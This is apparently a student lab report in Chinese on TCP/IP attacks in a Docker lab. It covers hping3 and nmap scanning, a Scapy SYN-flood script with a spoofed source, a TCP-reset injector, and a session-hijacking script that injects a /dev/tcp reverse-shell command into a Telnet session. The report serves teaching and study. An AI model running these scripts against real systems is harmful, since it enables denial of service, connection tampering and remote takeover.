

## 实验1：资产探查与端口扫描

### 部署网络拓扑

![image-20261013132327215](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013132327215.png)

vibecoding了一个根据网络拓扑生成对于dockerfile的小工具

这样就免去反复造轮子之苦

### hping3

在攻击者主机上使用hping3工具，分别通过ICMP、TCP、UDP三种方式对192.168.4.60 - 192.168.4.70间的地址进行探测，得出存活的3台主机的名单。

#### ICMP

##### 使用hping3的ICMP Echo 请求（通常被称为ping请求）进行探测，这里以192.168.4.60为例。 

```bash
hping3 -1 192.168.4.60 
```

![image-20261013132157277](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013132157277.png)

这个本质就是ping 192.168.4.60，ping不通，因为网络拓扑里我们没部署这个ip

![image-20261013132259864](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013132259864.png)

可以看到对于存在的ip，是可以探测出来的

##### 使用hping3发送多种类型TCP包进行主机探测，包括SYN、ACK、PUSH、FIN、RST等类型。 

```bash
hping3 -S 192.168.4.60 
```

还是先试一下不存在的ip，可以看到也是Unreachable

![image-20261013132532965](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013132532965.png)

那么如果对于存在的ip，结果如下

![image-20261013132618573](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013132618573.png)

##### 使用hping3的udp选项进行探测； 

```bash
hping3 --udp -p 123456 192.168.4.60 
```

实验报告这里的123456有误

![image-20261013132959301](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013132959301.png)

**UDP 端口号的合法范围是 0～65535**，怎么可能到123456？

<img src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013133426355.png" alt="image-20261013133426355" style="zoom:50%;" />

我们随便选了一个端口12345，诶，发现ICMP Port Unreachable，因为UDP它是无连接，不像TCP那样握手建立连接，所以对于未开放的端口，我们是无法用udp探测的，但是关键是我们也不知道哪些端口是开放的



### Nmap

相比于hping3只能探测单个目标，Nmap可以使用多种探测方式快速扫描整个网段，并且具备识别操作系统、服务和版本探测、以及脚本扫描等功能。虽然Nmap能通过参数指定扫描方式，但是通过抓包能观察到它会结合其它方式进行探测。在攻击者主机上使用Nmap对192.168.4.0/24网段进行扫描，获取存活主机名单、设备类型（如路由器信息）、操作系统等信息，完成表2。   

##### 使用Nmap主机探测功能获取192.168.4.0/24存活的主机名单。 

```bash
nmap -sn 192.168.4.0/24 
```

![image-20261013133742022](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013133742022.png)

可以看到一下子就扫描出来了，这里192.168.4.1是docker bridge的ip，192.168.4.10是路由器的接口ip

(2) 使用 Nmap获取主机的详细信息，如操作系统、主机类型、服务和版本等。 

```bash
nmap -sS 192.168.4.0/24 -O -A -sV 
```

![image-20261013134036812](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013134036812.png)

可以看到结果很多啊，那这边就复制一下文本

```bash
root@attacker:~$ nmap -sS 192.168.4.0/24 -O -A -sV 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-13 05:39 UTC
Nmap scan report for 192.168.4.1
Host is up (0.00018s latency).
All 1000 scanned ports on 192.168.4.1 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 21/tcp)
HOP RTT     ADDRESS
1   0.04 ms router.topology-lab_net_link_link-1 (192.168.2.10)
2   0.20 ms 192.168.4.1

Nmap scan report for 192.168.4.10
Host is up (0.000038s latency).
All 1000 scanned ports on 192.168.4.10 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE (using port 21/tcp)
HOP RTT     ADDRESS
1   0.03 ms 192.168.4.10

Nmap scan report for 192.168.4.61
Host is up (0.000064s latency).
All 1000 scanned ports on 192.168.4.61 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 21/tcp)
HOP RTT     ADDRESS
-   Hop 1 is the same as for 192.168.4.1
2   0.06 ms 192.168.4.61

Nmap scan report for 192.168.4.67
Host is up (0.000056s latency).
All 1000 scanned ports on 192.168.4.67 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 21/tcp)
HOP RTT     ADDRESS
-   Hop 1 is the same as for 192.168.4.1
2   0.05 ms 192.168.4.67

Nmap scan report for 192.168.4.68
Host is up (0.000071s latency).
All 1000 scanned ports on 192.168.4.68 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 21/tcp)
HOP RTT     ADDRESS
-   Hop 1 is the same as for 192.168.4.1
2   0.05 ms 192.168.4.68

Nmap scan report for 192.168.4.105
Host is up (0.00019s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.12.3)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.12.3
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 2 hops

TRACEROUTE (using port 21/tcp)
HOP RTT     ADDRESS
-   Hop 1 is the same as for 192.168.4.1
2   0.05 ms 192.168.4.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (6 hosts up) scanned in 17.64 seconds
```

对于没有开放tcp端口的机器，好像无法扫描到操作系统

主要原因是因为前面涉及网络拓扑的时候,我们把资产弄成client了，没开放服务

![image-20261013143307889](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013143307889.png)

稍微修改一下

现在就可以扫描出来了

![image-20261013143909801](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013143909801.png)

表3

|  存活主机ip  | 设备类型        | 操作系统       |
| :----------: | --------------- | -------------- |
| 192.168.4.61 | general purpose | Linux 4.15–5.8 |
| 192.168.4.67 | general purpose | Linux 4.15–5.8 |
| 192.168.4.68 | general purpose | Linux 4.15–5.8 |



##### 使用 Nmap对服务器（192.168.4.105）开展全端口扫描，获取端口开放状态，并判断端口对应的服务及版本

```bash
 nmap 192.168.4.105 -p- -O -A -sV 
```

![image-20261013141321773](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013141321773.png)

表4

|    端口    | 8000                                       |      |
| :--------: | ------------------------------------------ | ---- |
|  开放状态  | open                                       |      |
| 服务及版本 | http  SimpleHTTPServer 0.6 (Python 3.12.3) |      |

## 实验2：SYN洪泛攻击与防范 

### 网络拓扑

![image-20261013144834141](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013144834141.png)

加一个user,需要gui

##### 攻击者主机上提供Scapy环境，实验者需编辑Scapy脚本构造TCP SYN数据包

写成python脚本

```python
from scapy.all import * 
source_ip = '192.168.3.100' #伪造的源地址 
target_ip = '192.168.4.105' 
target_port = 8000 
ip_packet = IP(src=source_ip, dst=target_ip)
tcp_syn_packet = TCP(sport=RandShort(), dport=target_port, flags="S")
syn_packet = ip_packet / tcp_syn_packet
send(syn_packet, loop=1, verbose=False)
```

我们在attacker上面运行脚本

##### 在受害者主机上观察 TCP 的半连接状态，SYN_RECV 表示已接收到客户发送的 SYN 报⽂,并回复了 SYN-ACK 报⽂，正在等待客户端发送 ACK 报⽂建⽴ TCP 连接的状态。

```bash
netstat -nat | grep SYN_RECV
```

![image-20261013153151155](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013153151155.png)

奇怪的是，无法探测到半连接的状态

我们用tcpdump

![image-20261014090517071](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014090517071.png)

发现发来的不是192.168.2.100，而是192.168.4.1，是docker的网关,这是因为启用了 **SNAT/MASQUERADE（源地址转换）**

在docker网络搭建的时候关掉这个，但是现在

![image-20261014093536056](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014093536056.png)

现在对了，但是netstat上面还是找不到

这是因为我们看到这里有Flags[R]，也就是RST



这个机制是因为

Scapy 构造 SYN 报文并发送。

Server 收到 SYN，进入 `SYN_RECV`。

Server 向 `192.168.3.100` 返回 SYN+ACK。

`192.168.3.100` 的 Linux 内核收到 SYN+ACK。

但 Linux 内核没有找到与该连接对应的 TCP socket，因为 SYN 是 Scapy 通过原始套接字构造的。

Linux 内核因此发送 RST，拒绝这个连接



值得注意的是，实验指导书这边用的是192.168.3.101，原先以为是写错了，现在发现另有乾坤

![image-20261014094855968](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014094855968.png)

原来如此，既然已经存在的机器会发送RST，那只要找一个不存在的机器就好了，我们把源地址修改成192.168.3.101

![image-20261014101912029](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014101912029.png)

诶，现在就可以了，那另一方面，如果我们把192.168.3.100关机呢

<img src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014102003916.png" alt="image-20261014102003916" style="zoom:50%;" />

在docker里关掉这个，

![image-20261014102049191](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014102049191.png)

也成功了，所以问题就是Linux内核发现了并没有这个TCP连接，自动发送了RST所致



对⽐开启 SYN Cookies 前后 SYN_RECV 的数量，同时在⽤户主机浏览器上访问受害者Web ⽹站 http://192.168.4.105，对⽐ SYN Cookies 开启和关闭时的差异。

![image-20261014112057444](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014112057444.png)

但是打开却发现无法访问，这是因为我们前面把服务器开在8000端口了，而http默认是80端口

![image-20261014112154224](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014112154224.png)

修改一下就可以了

我们可以看到它是默认打开的

![image-20261013153217369](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013153217369.png)



(1)未开启 SYN Cookies 时

```bash
sysctl -w net.ipv4.tcp_syncookies=0
netstat -nat | grep SYN_RECV | wc -l

```

![image-20261014114613373](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014114613373.png)

(2)开启 SYN Cookies 后。

奇怪的是,关闭前后居然都是6

![image-20261014114406989](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014114406989.png)

这与指导书又不一样了

一个**非常值得怀疑的原因： HTTP 服务器可能把 TCP 监听队列大小设置成了 5**

检查监听队列大小

重点看 80 端口对应的 `Send-Q`：

```
State   Recv-Q  Send-Q  Local Address:Port
LISTEN  0       5       0.0.0.0:80
```

对于处于 `LISTEN` 状态的 TCP socket：

- `Recv-Q`：当前等待应用接受的已完成连接数量。
- `Send-Q`：应用设置的监听 backlog 上限。

Linux 内核的 SYN 队列容量也会受到应用调用 `listen()` 时传入的 backlog 参数影响。[OpenWall Lists](https://lists.openwall.net/netdev/2018/02/02/35?utm_source=chatgpt.com)

是因为我们使用下面的命令启动 HTTP 服务

```
python3 -m http.server 80
```

在 Python 3.12 中，`socketserver.TCPServer` 的默认 `request_queue_size` 通常为 **5**。而 `http.server` 就建立在这个类之上。[Python documentation](https://docs.python.org/3.12/library/socketserver.html?utm_source=chatgpt.com)



![image-20261014114817329](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014114817329.png)

我们把队列改成512试试

我们重新编写服务器

```python
from http.server import HTTPServer, SimpleHTTPRequestHandler

class Server(HTTPServer):
    request_queue_size = 512

server = Server(("0.0.0.0", 80), SimpleHTTPRequestHandler)
server.serve_forever()
```

诶，这时候就变成385了

```
sysctl net.ipv4.tcp_syncookies
netstat -nat | grep SYN_RECV | wc -l
```

![image-20261014120245235](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014120245235.png)

如果打开syncookies

![image-20261014120459692](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014120459692.png)

这时候就是513



实验指导书估计是用apache搭建的，我们用apache来搭建服务器,就是512，385

![image-20261014143650783](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014143650783.png)

![image-20261014144211901](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014144211901.png)

但是浏览器这边都能打开啊，没看到影响

我们把窗口调小一点就行了

![image-20261014192206115](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014192206115.png)

可以看到连不上了

![image-20261014192311289](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014192311289.png)

## **实验** **3**：**TCP** **连接重置**

### 网络拓扑

![image-20261015145447340](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015145447340.png)

#### 配置流量镜像

然后创建专用的镜像规则表：

```
nft add table ip lab_mirror
```

创建 PREROUTING 链：

```
nft 'add chain ip lab_mirror prerouting { type filter hook prerouting priority -150; policy accept; }'
```

这里选择 `PREROUTING`，是为了在报文经过后续 NAT 等处理前进行复制。

镜像服务器发往客户端的报文

```
nft add rule ip lab_mirror prerouting ip saddr 192.168.4.105 ip daddr 192.168.3.100 tcp sport 80 counter dup to 192.168.2.100
```

这条规则表示：当路由器收到：

```
192.168.4.105:80 → 192.168.3.100
```

的 TCP 报文时，额外复制一份，经路由发送给：

```
192.168.2.100
```

原始报文继续正常转发。

镜像客户端发往服务器的报文

```
nft add rule ip lab_mirror prerouting ip saddr 192.168.3.100 ip daddr 192.168.4.105 tcp dport 80 counter dup to 192.168.2.100
```

这样，两个方向的 HTTP 流量都会被镜像

![image-20261014201113108](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014201113108.png)



在攻击者主机上使⽤ Scapy 监听⼆者流量，获取 TCP 连接信息，伪造 TCP 重置数据包，实现⽤户主机与受害者服务器之间所有 TCP 流量的中断。在⽤户主机上通过访问正常服务器（192.168.4.106）对⽐ TCP 连接重置的实现效果，下⾯为核⼼代码的构造

```python
from scapy.all import * 
capture_filter = "tcp and src 192.168.4.105 and dst 192.168.3.100"
def packet_callback(packet):
  if packet.haslayer(TCP) and packet.haslayer(IP):
    tcp_sport = packet[TCP].sport # 源端⼝
    tcp_dport = packet[TCP].dport # ⽬的端⼝
    tcp_ack = packet[TCP].ack # ACK 序号
    # 在 send_reset_packet 函数中进⼀步构造和发送 TCP Reset 包
    send_reset_packet(packet[IP].src, packet[IP].dst, tcp_sport, tcp_dport, tcp_ack)
def send_reset_packet(ip_src, ip_dst, port_src, port_dst, ack):
  ip_layer = IP(src=ip_dst, dst=ip_src)
  tcp_layer = TCP(sport=port_dst, dport=port_src, flags='R', seq=ack)
  reset_packet = ip_layer / tcp_layer
  # 发送构造好的 RST 包
  send(reset_packet)
  
sniff(filter=capture_filter, prn=packet_callback, store=False)
```



连接发现都不支持ssh和ftp

![image-20261014202418182](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014202418182.png)

继续迭代前面网络拓扑工具，加入了ssh和ftp的支持

可以看到ssh和telnet、ftp攻击成功了，http没有

![image-20261015134033620](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015134033620.png)

原因是因为attacker发送的rst比较慢，然后http我们下载的文件又太小，attacker还没发送，http已经结束了，

我们限制一下速率就行

```bash
wget --limit-rate=1k http://192.168.4.105
```

![image-20261015134452033](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015134452033.png)

这样就成功了，同时测试了106服务器的telnet，可以正常连接

![image-20261015134743703](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015134743703.png)

ftp和http也没有问题

## 实验 4：TCP会话劫持

### 网络拓扑

![](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015145447340.png)

#### User Telnet登录server

在⽤户主机上使⽤ Telnet 正常登录受害者主机。

```bash
telnet 192.168.4.105
```

![image-20261015134922916](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015134922916.png)

#### Attacker编写攻击脚本

```python
from scapy.all import * 
capture_filter = "tcp and src 192.168.4.105 and dst 192.168.3.100"
spoofed_payload ="\n/bin/bash -i > /dev/tcp/192.168.2.100/9999 0<&1 2>&1\n"
def send_hijacking_packet(packet):
  if packet.haslayer(IP) and packet.haslayer(TCP) and packet.haslayer(Raw):
    ack_num = packet[TCP].ack # ACK 序号
    seq_num = packet[TCP].seq
    print("Capture packets")
    ip_layer = IP(src=packet[IP].dst, dst=packet[IP].src)
    ack_data = seq_num + len(packet[Raw].load) #packet 表示捕获到的数据包
    print(f"Capture from server to user: SEQ={ack_num} ACK={ack_data}")
    #构造 TCP 层，设置 seq、ack、flags
    tcp_layer = TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags='PA', seq=ack_num, ack=ack_data)
    hijacking_packet = ip_layer / tcp_layer / spoofed_payload
    send(hijacking_packet)
    print(f"[+] spoofed packets from user to server with payload: {spoofed_payload}")
  
sniff(filter=capture_filter, prn=send_hijacking_packet, store=False)
```

#### Attacker用nc监听

在攻击者主机上运⾏ TCP 劫持脚本后，开启监听⽤于接受反弹 shell 的 TCP 端⼝。

```bash
nc -lnvp 9999 #打开本地 9999 端⼝等待受害者建⽴连接
```



#### Attacker拿到反弹shell

在⽤户主机 Telnet 中输⼊内容，促使⽤户主机和受害者主机交互产⽣ TCP 流量。⼀旦⼆者产⽣ TCP 流量，攻击者就能第⼀时间捕获并向受害者推送构造好的内容（步骤 2中的反弹 shell 命令），使得受害者通过 Telnet 执⾏该恶意命令。

当受害者主机成功执⾏反弹 shell 命令后，受害者主机将会主动向攻击者主机建⽴连接，继⽽攻击者主机实现远程控制受害者主机

![image-20261015145207076](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015145207076.png)

![image-20261015145235896](https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015145235896.png)

可以看到attacker可以直接用反弹shell控制server，user那边完全输入不了